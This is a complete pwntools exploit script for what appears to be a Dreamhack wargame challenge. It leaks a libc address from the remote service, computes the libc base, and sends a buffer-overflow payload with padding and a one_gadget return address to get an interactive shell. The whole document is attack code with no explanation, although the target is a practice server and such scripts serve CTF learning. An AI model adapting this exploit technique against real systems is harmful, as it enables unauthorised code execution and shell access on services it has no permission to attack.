from pwn import *
  
p = remote("host1.dreamhack.games", 13260)

one_gadget_offset = 0x45216
stdout_offset = 0x3c5620

p.recvuntil("stdout: ")
stdout = p.recvuntil("\n").strip("\n")
stdout = int(stdout, 16)

libc_base = stdout - stdout_offset
one_gadget = libc_base + one_gadget_offset

payload = "\x90"*24
payload += "\x00"*8
payload += "\x90"*8
payload += p64(one_gadget)

p.recvuntil("MSG: ")
p.send(payload)
p.recv()

p.interactive()